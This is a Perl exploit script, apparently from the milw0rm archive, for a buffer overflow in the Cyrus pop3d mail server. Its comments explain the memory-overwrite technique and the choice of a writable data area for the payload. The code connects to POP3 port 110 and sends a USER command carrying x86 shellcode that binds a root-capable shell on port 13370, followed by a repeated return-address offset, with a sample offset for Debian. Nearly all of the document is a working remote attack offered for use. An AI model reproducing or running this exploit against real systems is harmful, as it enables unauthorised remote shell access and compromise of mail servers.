#!/usr/bin/perl
## Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
## Name: bid-18056.pl
## Date: 08/12/2006
## 
## Description: this is yet another exploit for the cyrus pop3d buffer overflow. I tried both public
##  exploits and not either of them worked (not that they don't but coding my own is generaly faster
##  and easier) so I coded my own. The exploit by kcope seems to be done right and maybe i just got realy
##  unlucky and missed the offset in between the 5 runs i gave it. The one from bannedit was interesting...
##  realy nice idea about overwriting the pointer and sticking your shellcode in GOT. Only problem is that
##  when i was writing this exploit with the same method, and i placed my shellcode in GOT, functions before
##  the return from the vuln function where segfaulting first by trying to actualy *use* the GOT! So what I have
##  done here is used the same method, yet found a data area that is not going to freak pop3d
##  out before it gets to the return. Specificy I use part of the .data segment (or was it .bss, anyways) labeled
##  'buf'. With this the same one-offset-per-machine is gained that bannedit was achieving. 
##
## Other: Basicly what all this means, is you just have to give an offset that is a location in memory that
##  is writeable and executable (anything in .data, .bss, .stack, .heap, etc) and make sure it's not something
##  that will need to be used by functions in pop3d before popd_canon_user() returns and hence executes your
##  shellcode (because it'll segfault and won't get executed).
##
## Note: bindport is 13370
#################################################################################################################
use IO::Socket;
use strict;

my $host = $ARGV[0] || help();
my $offset = $ARGV[1] || help();
my $port = 110;

# stollen from cyruspop3d.c because this actualy worked, i couldn't get any
# metasploit sc to work (as usualy, hmph)
my $shellcode = 
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96".
"\x43\x52\x66\x68\x34\x3a\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56".
"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1".
"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0".
"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53".
"\x89\xe1\xcd\x80";

my $sock = IO::Socket::INET->new('PeerAddr' => $host,
                                 'PeerPort' => $port) or die ("-!> unable to connect to '$host:$port': $!\n");

$sock->autoflush();

print $sock "USER ";                       ## begin USER command with just that
print $sock "$shellcode";                  ## shellcode is *userbuf is *user
print $sock pack('l', hex($offset)) x 120; ## location overwrites EIP and *out, userbuf/user written to *out
print $sock "\n";                          ## that simple

sub help {
	print "bid-18056.pl by K-sPecial (xzziroz.net) of .aware (awarenetwork.org)\n";
	print "08/12/2006\n\n";
	print "perl $0 \$host \$offset\n\n";
	
	print "Offsets: \n";
	print "0x8106c20 (debian 3.1 - 2.6.16-rc6)\n";

	exit(0);
}

# milw0rm.com [2006-08-14]
